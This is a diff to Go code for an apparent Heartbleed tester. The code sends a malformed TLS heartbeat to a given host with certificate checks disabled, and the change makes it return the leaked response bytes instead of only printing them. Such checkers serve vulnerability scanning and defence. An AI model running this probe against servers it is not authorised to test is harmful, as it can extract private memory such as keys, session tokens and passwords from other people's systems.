@@ -38,9 +38,9 @@ func buildEvilMessage(payload []byte) []byte {
 	return buf.Bytes()
 }
 
-func heartbleedCheck(conn *tls.Conn, payload []byte, vuln chan bool) func([]byte) {
+func heartbleedCheck(conn *tls.Conn, payload []byte, buf *bytes.Buffer, vuln chan bool) func([]byte) {
 	return func(data []byte) {
-		spew.Dump(data)
+		spew.Fdump(buf, data)
 		if bytes.Index(data, payload) == -1 {
 			vuln <- false
 		} else {
@@ -50,14 +50,15 @@ func heartbleedCheck(conn *tls.Conn, payload []byte, vuln chan bool) func([]byte
 	}
 }
 
-func Heartbleed(host string, payload []byte) error {
+func Heartbleed(host string, payload []byte) (out []byte, err error) {
 	conn, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
 	if err != nil {
-		return err
+		return
 	}
 
 	var vuln = make(chan bool, 1)
-	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, payload, vuln))
+	buf := new(bytes.Buffer)
+	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, payload, buf, vuln))
 
 	go func() {
 		conn.Read(nil)
@@ -66,11 +67,13 @@ func Heartbleed(host string, payload []byte) error {
 	select {
 	case status := <-vuln:
 		if status {
-			return nil
+			out = buf.Bytes()
+			return
 		} else {
-			return ErrPayloadNotFound
+			err = ErrPayloadNotFound
+			return
 		}
 	case <-time.After(3 * time.Second):
-		return ErrPayloadNotFound
+		return nil, ErrPayloadNotFound
 	}
 }
